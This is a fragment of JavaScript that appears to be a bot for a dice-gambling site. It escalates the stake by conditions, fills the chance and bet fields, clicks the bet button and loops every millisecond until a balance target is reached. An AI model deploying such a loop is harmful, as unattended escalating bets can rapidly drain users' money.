if ((burgzie<=(zeggar+zeggar))&&(skittle<=(zeggar+zeggar))&&(burgzie>(((Math.floor(burgzie/tens))*tens)+sevens))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+eights))) {
    zeggar = beast*2;
    fran = parseFloat(burgzie);
}
if ((burgzie<=(zeggar+zeggar))&&(skittle<=(zeggar+zeggar))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+sevens))) {
    zeggar = beast;
    fran = 0;
}
if (burgzie>=(trget*24)){
    console.log(""winner winner chicken dinner"");
    return;
}
toot = ((zeggar*1).toFixed(8));
$('#pct_chance').val(49.5);
$('#pct_bet').val(toot);
$('#a_hi').click();
setTimeout(() => get(), 1);
}
get();"
